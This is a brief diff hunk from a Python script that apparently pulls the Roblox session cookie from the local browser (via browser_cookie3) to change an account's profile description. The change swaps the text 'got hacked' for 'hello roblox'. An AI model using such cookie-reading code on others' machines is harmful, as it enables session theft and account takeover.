@@ -3,7 +3,7 @@ import time
 import browser_cookie3
 import requests
 
-NEW_DESCRIPTION = "got hacked"
+NEW_DESCRIPTION = "hello roblox"
 
 def get_roblox_cookie_from_browser():
     try:
